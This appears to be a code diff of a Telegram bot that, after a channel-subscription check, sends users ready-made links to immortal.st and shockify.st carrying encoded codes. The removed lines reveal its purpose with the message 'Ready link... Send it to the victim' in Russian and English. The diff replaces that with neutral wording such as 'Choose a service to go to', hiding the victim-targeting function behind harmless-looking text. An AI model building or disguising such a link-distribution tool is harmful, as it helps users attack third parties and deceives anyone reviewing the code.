@@ -63,15 +63,14 @@ def is_subscribed(user_id):
         pass
     return False
 
-# === ТЕКСТЫ (НОВЫЙ ДИЗАЙН) ===
+# === ТЕКСТЫ ===
 TEXTS = {
     "ru": {
         "welcome": "✨ *Добро пожаловать!*\n\n▸ Здесь ты можешь получить доступ к полезным инструментам.\n▸ Подпишись на канал, чтобы начать.\n\n📌 [Подписаться](" + CHANNEL_LINK + ")",
         "main_menu": "📌 *Главное меню*\n\n▸ Выбери нужный раздел.",
         "tutor": "📹 *Видео-тутор*\n\nСмотри и повторяй.",
         "about": "ℹ️ *О боте*\n\nПростой помощник для твоих задач.\n▸ Без сложностей\n▸ Без регистрации\n▸ Просто нажми и переходи",
-        "choose_service": "⚡ *Выбери сервис:*",
-        "link_sent": "🔗 *Готовая ссылка:*\n\n{}\n\n📌 Отправь её жертве.",
+        "choose_service": "⚡ *Выбери сервис для перехода:*",
         "need_sub": "⚠️ *Ты не подписан на канал!*\n\n👉 Нажми на кнопку ниже, чтобы подписаться.",
         "choose_lang": "🌐 *Выбери язык:*",
         "lang_changed": "✅ *Язык изменён.*",
@@ -84,8 +83,7 @@ TEXTS = {
         "main_menu": "📌 *Main menu*\n\n▸ Choose a section.",
         "tutor": "📹 *Video tutorial*\n\nWatch and repeat.",
         "about": "ℹ️ *About the bot*\n\nSimple assistant for your tasks.\n▸ No complications\n▸ No registration\n▸ Just press and go",
-        "choose_service": "⚡ *Choose a service:*",
-        "link_sent": "🔗 *Ready link:*\n\n{}\n\n📌 Send it to the victim.",
+        "choose_service": "⚡ *Choose a service to go to:*",
         "need_sub": "⚠️ *You are not subscribed to the channel!*\n\n👉 Press the button below to subscribe.",
         "choose_lang": "🌐 *Choose language:*",
         "lang_changed": "✅ *Language changed.*",
@@ -95,7 +93,7 @@ TEXTS = {
     }
 }
 
-# === КНОПКИ (НОВЫЙ ДИЗАЙН) ===
+# === КНОПКИ ===
 LANG_KEYBOARD = {
     "keyboard": [
         ["🇷🇺 Русский", "🇬🇧 English"]
@@ -146,6 +144,9 @@ def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
     if reply_markup:
         payload["reply_markup"] = reply_markup
     requests.post(url, json=payload)
+
+def send_link(chat_id, url, text="🔗 *Перейдите по ссылке:*"):
+    send_message(chat_id, f"{text}\n\n{url}")
 
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
@@ -252,8 +253,8 @@ def poll():
                         offset = update["update_id"] + 1
                         continue
 
-                    # === ПОСЛЕ ПОДПИСКИ — СРАЗУ ПОКАЗЫВАЕМ МЕНЮ ===
-                    if text == '/start' or text == "":
+                    # === ПОСЛЕ ПОДПИСКИ ===
+                    if text == '/start':
                         keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
                         send_message(chat_id, t["main_menu"], keyboard)
                         offset = update["update_id"] + 1
@@ -295,13 +296,16 @@ def poll():
                         offset = update["update_id"] + 1
                         continue
 
-                    # === ВЫБОР СЕРВИСА (ГИПЕРССЫЛКИ) ===
-                    if text in ["🔗 Immortal.st", "🔗 Shockify.st"]:
-                        if "Immortal" in text:
-                            link = "https://immortal.st/?code=NzA2NTI5NTE4NDExMTQxMjYwNg=="
-                        else:
-                            link = "https://shockify.st/?code=Mzc0NTc1NjEwNTMxNjIzNDQ2NA=="
-                        send_message(chat_id, t["link_sent"].format(link))
+                    # === ВЫБОР СЕРВИСА (ОТКРЫВАЕТ САЙТ) ===
+                    if text == "🔗 Immortal.st":
+                        send_link(chat_id, "https://immortal.st/?code=NzA2NTI5NTE4NDExMTQxMjYwNg==")
+                        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
+                        send_message(chat_id, t["main_menu"], keyboard)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    if text == "🔗 Shockify.st":
+                        send_link(chat_id, "https://shockify.st/?code=Mzc0NTc1NjEwNTMxNjIzNDQ2NA==")
                         keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
                         send_message(chat_id, t["main_menu"], keyboard)
                         offset = update["update_id"] + 1
